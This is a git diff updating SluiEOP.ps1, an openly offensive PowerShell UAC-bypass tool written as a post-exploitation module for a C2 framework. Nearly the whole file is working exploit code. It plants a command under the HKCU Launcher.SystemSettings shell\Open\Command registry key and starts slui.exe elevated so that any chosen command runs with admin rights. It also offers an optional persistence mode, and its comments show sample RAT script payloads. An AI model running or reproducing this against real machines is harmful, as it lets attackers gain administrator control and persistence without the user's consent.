@@ -1,13 +1,13 @@
 <#
 .SYNOPSIS
-   SluiEOP can be used to escalate privileges or to execute a command with high integrity (Admin)
+   SluiEOP can be used has UAC bypass or to execute one command with high privileges (Admin)
 
    Author: r00t-3xp10it (SSA RedTeam @2020)
    Tested Under: Windows 10 - Build 18363
    EOP Disclosure By: @mattharr0ey
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev Version: v1.9
+   PS cmdlet Dev Version: v1.10
 
 .DESCRIPTION
    How does Slui UAC bypass work? There is a tool named ChangePK in System32 has a service that opens a window (for you)
@@ -18,14 +18,14 @@
    powershell.exe Start-Process "C:\Windows\System32\slui.exe" -verb runas (SluiEOP PS cmdlet automates all of this tasks).
 
 .NOTES
-   SluiEOP cmdlet was written to be one meterpeter C2 post-exploit module.
+   Its Mandatory the use of "double quotes" in the 1º parameter input.
    SluiEOP cmdlet supports [ CMD | POWERSHELL | PYTHON ] scripts execution.
-   To run binarys (.exe) through this cmdlet use: cmd /c start binary.exe
+   To run binarys (.exe) through this cmdlet use: "cmd /c start binary.exe"
 
    This cmdlet 'reverts' regedit hacks to the previous state before the EOP.
    Unless '$MakeItPersistence' its set to "True". In that case the EOP registry
    hacks will NOT be deleted in the end of exec making the '$Command' persistence.
-   Remark: .\SluiEOP.ps1 "deleteEOP" argument its used to delete the persistence.
+   Remark: .\SluiEOP.ps1 "deleteEOP" argument deletes the '$Command' persistence.
 
 .EXAMPLE
    PS C:\> .\SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
@@ -45,25 +45,26 @@
 
 .EXAMPLE
    PS C:\> .\SluiEOP.ps1 "cmd /c start regedit.exe" -Verbose
-   Displays process verbose info and Spawn regedit with high privileges (Admin)
-   Remark: This function does not work under meterpeter C2 framework
+   Spawn regedit with high privileges (Admin) and display process verbose info
+   Remark: This function does not work under meterpeter C2 framework (automatic)
 
 .EXAMPLE
-   PS C:\> .\SluiEOP.ps1 "cmd /c start mspaint.exe" -Force
-   Force EOP (create vuln Hive) and spawn mspaint with high privileges (Admin)
-   Remark: This function does not work under meterpeter C2 framework
+   PS C:\> .\SluiEOP.ps1 "powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser" -Force
+   Bypass cmdlet vulnerability tests (Force) to execute '$command' with high privileges (Admin)
+   Remark: This function does not work under meterpeter C2 framework (automatic)
 
 .INPUTS
    None. You cannot pipe objects into SluiEOP.ps1
 
 .OUTPUTS
-   Gets the spawned process <UserDomain> <ProcessName> <Status> and <PID>
-   If active '$VerboseMode' then more detailed information will be displayed.
+   Audit the spawned process <UserDomain> <ProcessName> <Status> and <PID>
+   If used '-Verbose' parameter then displays process detailed information
 
 .LINK
     https://github.com/r00t-3xp10it/meterpeter
     https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/SluiEOP.ps1
     https://medium.com/@mattharr0ey/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b
+    https://github.com/r00t-3xp10it/meterpeter/wiki/SluiEOP---UACbypass-Escalation-Of-Privileges
 #>
 
 
@@ -73,11 +74,15 @@ $EOP_Success = $False          # Remote EOP execution status [<dontchange>]
 $MakeItPersistence = "False"   # Change this value to "True" to make the '$Command' persistence
 $param1 = $args[0]             # User Inputs [ <Arguments> ] [<Parameters>] [<dontchange>]
 $param2 = $args[1]             # User Inputs [ <Arguments> ] [<Parameters>] [<dontchange>]
-$host.UI.RawUI.WindowTitle = "@SluiEOP v1.9 {SSA@redTeam}"
-If($param2 -eq "-Verbose" -or $param2 -eq "-verbose"){$VerboseMode = "True"}
+$host.UI.RawUI.WindowTitle = "@SluiEOP v1.10 {SSA@redTeam}"
+If($param2 -ieq "-Verbose"){$VerboseMode = "True"}
 If(-not($param1) -or $param1 -eq $null){
    $Command = "$Env:WINDIR\System32\cmd.exe"
-   Write-Host "[ ERROR ] Syntax: .\SluiEOP.ps1 `"Command to execute`"`n" -ForegroundColor Red -BackgroundColor Black
+   Write-Host "`n[ ERROR ] This cmdlet requires the first parameter to run." -ForegroundColor Red -BackgroundColor Black
+   Write-Host "Syntax: [scriptname] [parameter <`"mandatory`">] [-parameter <optional>]`n" 
+   Write-Host ".\SluiEOP.ps1 `"Command to execute`""
+   Write-Host ".\SluiEOP.ps1 `"Command to execute`" -Force"
+   Write-Host ".\SluiEOP.ps1 `"Command to execute`" -Verbose"
    Start-Sleep -Milliseconds 1200
 }Else{
    $Command = "$param1"
@@ -85,10 +90,19 @@ If(-not($param1) -or $param1 -eq $null){
 
 ## Check for regedit vulnerable HIVE existence before continue any further ..
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -EA SilentlyContinue
-If($CheckVuln -eq $True -or $param2 -eq "-Force" -or $param2 -eq "-force"){
+If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
+
+   ## Check for windows native vulnerable binary existence.  
+   If(-not(Test-Path -Path "$Env:WINDIR\System32\Slui.exe") -and $param2 -iNotMatch '-Force'){
+      If(Test-Path "$Env:TMP\SluiEOP.ps1"){Remove-Item -Path "$Env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
+      Write-Host "`nSluiEOP v1.10 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
+      Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
+      Write-Host "[ ] NOT FOUND: '$Env:WINDIR\System32\Slui.exe'`n" -ForegroundColor red -BackgroundColor Black
+      Exit
+   }
 
    ## SluiEOP meterpeter post-module banner
-   Write-Host "`nSluiEOP v1.9 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
+   Write-Host "`nSluiEOP v1.10 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
    Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 400
 
    ## Delete 'persistence' '$Command' left behind by: '$MakeItPersistence' function.
@@ -101,10 +115,10 @@ If($CheckVuln -eq $True -or $param2 -eq "-Force" -or $param2 -eq "-force"){
          Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
          Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
          Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
-         Write-Host "[ ] Success   => MakeItPersistence (`$Command) reverted."
+         Write-Host "[ ] Success   => MakeItPersistence (`$Command) reverted.";Start-Sleep -Milliseconds 400
          Write-Host "[ ] HIVE      => HKCU:\Software\Classes\Launcher.SystemSettings`n"
       }Else{
-         Write-Host "[ ] Failed    => None SluiEOP registry keys found under:"
+         Write-Host "[ ] Failed    => None SluiEOP registry keys found under:" -ForegroundColor Red;Start-Sleep -Milliseconds 400
          Write-Host "[ ] HIVE      => HKCU:\Software\Classes\Launcher.SystemSettings`n"
       }
       If(Test-Path "$Env:TMP\SluiEOP.ps1"){Remove-Item -Path "$Env:TMP\SluiEOP.ps1" -Force -EA SilentlyContinue}
@@ -117,12 +131,12 @@ If($CheckVuln -eq $True -or $param2 -eq "-Force" -or $param2 -eq "-force"){
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value 'Open' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Force|Out-Null;Start-Sleep -Milliseconds 400
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Force|Out-Null;Start-Sleep -Milliseconds 400
-   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "(default)" -Value Open -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
-   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "MuiVerb" -Value "@appresolver.dll,-8501" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
+   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "(default)" -Value Open -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400
+   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open" -Name "MuiVerb" -Value "@appresolver.dll,-8501" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 400
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Force|Out-Null;Start-Sleep -Milliseconds 400
 
    ## The Next Registry entry allow us to execute our command under high privileges (Admin)
-   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "(default)" -Value "$Command" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Seconds 1
+   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "(default)" -Value "$Command" -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
    # ---
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -Name "DelegateExecute" -Value '' -Force -ErrorAction SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 700
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Force|Out-Null;Start-Sleep -Milliseconds 400
@@ -134,15 +148,17 @@ If($CheckVuln -eq $True -or $param2 -eq "-Force" -or $param2 -eq "-force"){
    ## Start the vulnerable Process { using powershell }
    Write-Host "[+] Hijacking => Slui.exe process execution."
    Start-Sleep -Milliseconds 3000;Start-Process "$Env:WINDIR\System32\Slui.exe" -Verb runas
+   ## '$LASTEXITCODE' contains the exit code of the last Win32 executable execution
+   If($LASTEXITCODE -eq 0){$ReturnCode = "0-"}Else{$ReturnCode = "1-"}
 
-   Start-Sleep -Milliseconds 4000 # Give time for Slui.exe to finish
+   Start-Sleep -Milliseconds 3800 # Give time for Slui.exe to finish
    ## If '$MakeItPersistence' is set to "True" then the EOP registry hacks will NOT
    # be deleted in the end of cmdlet execution, making the 'command' persistence.
    If($MakeItPersistence -eq "False"){
       ## Revert Regedit to 'DEFAULT' settings after EOP finished ..
       Write-Host "[+] Deleting  => EOP registry hacks (revert)"
-      Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
-      Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
+      Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Milliseconds 400
+      Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Milliseconds 400
       Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
    }Else{
       Write-Host "[ ] Executing => MakeItPersistence (True)" -ForeGroundColor yellow;Start-Sleep -Milliseconds 400
@@ -151,102 +167,85 @@ If($CheckVuln -eq $True -or $param2 -eq "-Force" -or $param2 -eq "-force"){
 
    <#
    .SYNOPSIS
-      Helper - Gets the spawned process <UserDomain> <ProcessName> <Status> and <PID>
+      Helper - Audit the Spawned process <UserDomain> <ProcessName> <Status> and <PID>
       Author: @r00t-3xp10it
 
    .DESCRIPTION
-      Gets the spawned process <UserDomain> <ProcessName> <Status> and <PID>
-      If active '$VerboseMode' then more detailed information will be displayed.
+      Audit the spawned process <UserDomain> <ProcessName> <Status> and <PID>
+      If used '-Verbose' parameter then displays process detailed information
 
    .EXAMPLE
-      PS C:\> .\SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
+      PS C:\> .\SluiEOP.ps1 "cmd.exe /c start regedit.exe"
 
       UserDomain ProccessName Status   PID
       ---------- ------------ ------   ---
-      SKYNET     notepad      success  5543
+      SKYNET     regedit      success  5543
    #>
 
-   ## Extracting remote Spawned ProcessName|PID
+   ## Audit remote Spawned ProcessName|ProcessPath|StartTime|PID
    Write-Host "[+] Executing => EOP output Table displays.`n";Start-Sleep -Milliseconds 400
-   If($Command -match '^[cmd]' -and $Command -match ' ' -and $Command -NotMatch '[.bat]$' -and $Command -NotMatch '[.ps1]$' -and $Command -NotMatch '[.py]$'){
-      ## String: "C:\Windows\System32\cmd.exe /c start notepad.exe"
-      $ProcessName = $Command -Split(' ')|Select -Last 1 -EA SilentlyContinue
-      If($ProcessName -match '[.exe]$'){
-         $ProcessToken = "$ProcessName"
-         $ReturnCode = "1";$ProcessName = $ProcessName -replace '.exe',''
-         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-         If($EOPID -match '^\d+$'){$EOP_Success = $True}
-      }Else{
-         $EOPID = "null"
-      }
-   }
-   ElseIf(-not($Command -match ' ') -and $Command -match '\\'){
-      ## String: "$Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
+   If($Command -NotMatch '\\' -and $Command -NotMatch '\s'){
+      ## String: "powershell.exe"
       $ProcessName = Split-Path "$Command" -Leaf
-      If($ProcessName -match '[.exe]$'){
-         $ProcessToken = "$ProcessName"
-         $ReturnCode = "2";$ProcessName = $ProcessName -replace '.exe',''
-         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-         If($EOPID -match '^\d+$'){$EOP_Success = $True}
-      }Else{
-         $EOPID = "null"
-      }
+      $ReturnCode = "$ReturnCode"+"1"
+   }ElseIF($Command -Match '\\' -and $Command -NotMatch '\s'){
+      ## String: $Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe
+      $ProcessName = $Command -Split('\\')|Select -Last 1 -EA SilentlyContinue
+      $ReturnCode = "$ReturnCode"+"2"
+   }ElseIF($Command -Match '\s' -and $Command -NotMatch '\\'){
+      ## String: powershell.exe Start-Process regedit.exe
+      $ProcessName = $Command -Split('\s')|Select -Last 1 -EA SilentlyContinue
+      $ReturnCode = "$ReturnCode"+"3"
+   }ElseIF($Command -Match '^(C:\\)' -and $Command -Match '\s' -and $Command -NotMatch '[.bat]$' -and $Command -NotMatch '[.ps1]$' -and $Command -NotMatch '[.py]$'){
+      ## String: C:\Windows\System32\cmd.exe /c start notepad.exe
+      #  String: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process regedit.exe
+      $ProcessName = $Command -Split('\s')|Select -Last 1 -EA SilentlyContinue
+      $ReturnCode = "$ReturnCode"+"4"
+   }ElseIF($Command -Match '.Env:' -and $Command -Match '\s'){
+      ## String: $Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process regedit.exe
+      #  String: $env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process regedit.exe
+      $ProcessName = $Command -Split('\s')|Select -Last 1 -EA SilentlyContinue
+      $ReturnCode = "$ReturnCode"+"5"
+   }Else{
+      ## String: cmd /c start C:\Users\pedro\AppData\Local\Temp\rat.bat
+      #  String: powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1
+      $ProcessName = Split-Path "$Command" -Leaf
+      $ReturnCode = "$ReturnCode"+"6"
    }
-   ## [CMD|POWERSHELL|PYTHON] (scripts) - interpreters supported
-   ElseIf($Command -match '^[powershell]' -or $Command -match '^[cmd]' -or $Command -match '^[python]' -and $Command -match ' ' -and $Command -match '[.ps1]$' -or $Command -match '[.bat]$' -or $Command -match '[.py]$'){
-      ## String: "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1"
-      If($Command -match '\\'){
-         $ProcessName = $Command -Split('\\')|Select -Last 1 -EA SilentlyContinue
-      }Else{
-         $ProcessName = $Command -Split(' ')|Select -Last 1 -EA SilentlyContinue
-      }
 
-      ## Extract powershell.exe interpreter process PID
-      If($Command -match '^[powershell].*[.ps1]$'){
-         $ProcessToken = "powershell.exe"
-         $ReturnCode = "3.0";$EOPID = Get-Process powershell -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-         If($EOPID -match '^\d+$'){$EOP_Success = $True}
-      }
-      ## Extract cmd.exe interpreter process PID
-      ElseIf($Command -match '^[cmd].*[.bat]$'){
-         $ProcessToken = "cmd.exe"
-         $ReturnCode = "3.1";$EOPID = Get-Process cmd -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-         If($EOPID -match '^\d+$'){$EOP_Success = $True} 
-      }
-      ## Extract python.exe interpreter process PID
-      ElseIf($Command -match '^[python].*[.py]$'){
-         $ProcessToken = "python.exe"
-         $ReturnCode = "3.2";$EOPID = Get-Process python -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-         If($EOPID -match '^\d+$'){$EOP_Success = $True} 
-      }
-      Else{
-         $EOPID = "null"
-      }
-   }
-   Else{
-      If($Command -notmatch '\\' -and $Command -notmatch ' '){
-         ## String: "powershell.exe"
-         $ProcessName = Split-Path "$Command" -Leaf
-      }ElseIF($Command -match '\\' -and $Command -notmatch ' '){
-         ## String: "$Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
-         $ProcessName = $Command -Split('\\')|Select -Last 1 -EA SilentlyContinue
-      }ElseIF($Command -match ' ' -and $Command -notmatch '\\'){
-         ## String: "powershell.exe Start-Process regedit.exe"
-         $ProcessName = $Command -Split(' ')|Select -Last 1 -EA SilentlyContinue
-      }ElseIF($Command -match '^[C:\\]' -and $Command -match ' '){
-         ## String: "$Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process regedit.exe"
-         $ProcessName = $Command -Split(' ')|Select -Last 1 -EA SilentlyContinue
-      }Else{
-         $ProcessName = Split-Path "$Command" -Leaf
-      }
-      If($ProcessName -match '[.exe]$'){
-         $ProcessToken = "$ProcessName"
-         $ReturnCode = "4";$ProcessName = $ProcessName -replace '.exe',''
-         $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
-         If($EOPID -match '^\d+$'){$EOP_Success = $True}
-      }Else{
-         $EOPID = "null"
-      }
+   ## Audit Spawn Process Group Owner
+   # Function to audit [binary|script|command] Tokens
+   If($ProcessName -Match '[.exe]$'){
+      $ProcessToken = "$ProcessName";$ReturnCode = "$ReturnCode"+":1"
+      $ProcessName = $ProcessName -replace '.exe',''
+      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
+   }ElseIF($Command -Match '^[powershell].*[.ps1]$'){
+      $ProcessToken = "powershell.exe";$ReturnCode = "$ReturnCode"+":2"
+      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
+   }ElseIF($Command -Match '^[cmd].*[.bat]$' -or $Command -Match '^[cmd].*[.ps1]$' -or $Command -Match '^[cmd].*[.py]$'){
+      $ProcessToken = "cmd.exe";$ReturnCode = "$ReturnCode"+":3"
+      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
+   }ElseIF($Command -Match '^[python].*[.py]$'){
+      $ProcessToken = "python.exe";$ReturnCode = "$ReturnCode"+":4"
+      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
+   }ElseIF($Command -Match '^[powershell]' -and $Command -NotMatch '[.exe]$' -and $Command -NotMatch '[.ps1]$' -and $Command -NotMatch '[.bat]$' -and $Command -NotMatch '[.py]$'){
+      ## String: powershell Set-ExecutionPolicy Unrestricted -Scope Currentuser
+      $ProcessToken = "powershell.exe";$ReturnCode = "$ReturnCode"+":5"
+      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
+      $ProcessName = "powershell"
+   }ElseIF($Command -Match '^[cmd]' -and $Command -NotMatch '[.exe]$' -and $Command -NotMatch '[.ps1]$' -and $Command -NotMatch '[.bat]$' -and $Command -NotMatch '[.py]$'){
+      ## String: cmd.exe /c REG ADD 'HKCU\Software\Microsoft\Windows' /v NoFileMRU /t REG_DWORD /d 1 /f
+      $ProcessToken = "cmd.exe";$ReturnCode = "$ReturnCode"+":6"
+      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
+      $ProcessName = "cmd"
+   }Else{
+      $EOPID = "null"
    }
 
    ## Build MY PSObject Table to display results
@@ -257,9 +256,9 @@ If($CheckVuln -eq $True -or $param2 -eq "-Force" -or $param2 -eq "-force"){
       $SpawnPath = (Get-Process $ProcessName -EA SilentlyContinue|select *).Path|Select -Last 1 -EA SilentlyContinue
       $SpawnTime = (Get-Process $ProcessName -EA SilentlyContinue|select *).StartTime|Select -Last 1 -EA SilentlyContinue
       $GroupToken = Get-WmiObject Win32_Process -Filter "name='$ProcessToken'"|Select Name, @{Name="UserName";Expression={$_.GetOwner().Domain+"\"+$_.GetOwner().User}}|Select -Last 1|Select-Object -ExpandProperty UserName
-      $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "InnerCode" -Value "$ReturnCode"
+      $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ReturnCode" -Value "$ReturnCode"
     }
-    If($EOP_Success -eq $True){$EOPState = "success"}Else{$EOPState = "error?";$EOPID = "null"}
+    If($EOP_Success -eq $True){$EOPState = "success"}Else{$EOPState = "error";$EOPID = "null"}
     If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Architecture" -Value "$Env:PROCESSOR_ARCHITECTURE"}
     $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "UserDomain" -Value "$Env:USERDOMAIN"
     $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
@@ -275,9 +274,10 @@ If($CheckVuln -eq $True -or $param2 -eq "-Force" -or $param2 -eq "-force"){
     echo $MYPSObjectTable > $Env:TMP\sLUIEop.log
 
 }Else{
-   ## Vulnerable registry Hive => NOT found
-   Write-Host "`nSluiEOP v1.9 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
-   Write-Host "[ ERROR ] System Doesn't Seems Vulnerable, Aborting ..`n" -ForegroundColor red -BackgroundColor Black
+   ## Vulnerable registry Hive => NOT FOUND
+   Write-Host "`nSluiEOP v1.10 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
+   Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
+   Write-Host "[ ] NOT FOUND: 'HKCU:\Software\Classes\Launcher.SystemSettings'`n" -ForegroundColor red -BackgroundColor Black
 }
 
 ## Clean old files left behind by SluiEOP after the job is finished ..
